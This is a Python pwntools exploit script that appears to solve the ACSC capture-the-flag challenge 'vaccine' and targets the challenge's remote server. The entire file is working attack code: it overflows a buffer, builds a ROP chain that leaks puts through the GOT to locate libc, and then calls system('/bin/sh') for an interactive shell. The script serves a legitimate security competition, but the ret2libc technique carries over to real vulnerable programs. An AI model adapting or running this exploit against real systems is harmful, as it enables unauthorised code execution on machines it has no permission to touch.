from pwn import *
elf = context.binary = ELF('./vaccine_patched')
libc = ELF('./libc.so.6')
context.log_level = 'DEBUG'
rop_elf = ROP(elf)
pop_rdi = rop_elf.find_gadget(["pop rdi","ret"])[0]
ret = rop_elf.find_gadget(["ret"])[0]
p = remote("vaccine-2.chal.ctf.acsc.asia",1337)
#p = process()
p.recv()
payload = b'\x00'*112 + b'\x00'*104 + b'A\x00'*24 
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(elf.got.puts)
payload += p64(elf.plt.puts)
payload += p64(elf.sym._start)
p.sendline(payload)
leak = u64(p.recv().split(b'\n')[-2].ljust(8, b"\x00"))
libc.address = leak-0x84420

print(hex(libc.address))
bin_sh = next(libc.search(b"/bin/sh"))
system = libc.symbols["system"]

payload = b'\x00'*112 + b'\x00'*104 + b'A\x00'*24 
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)
p.sendline(payload)

p.interactive()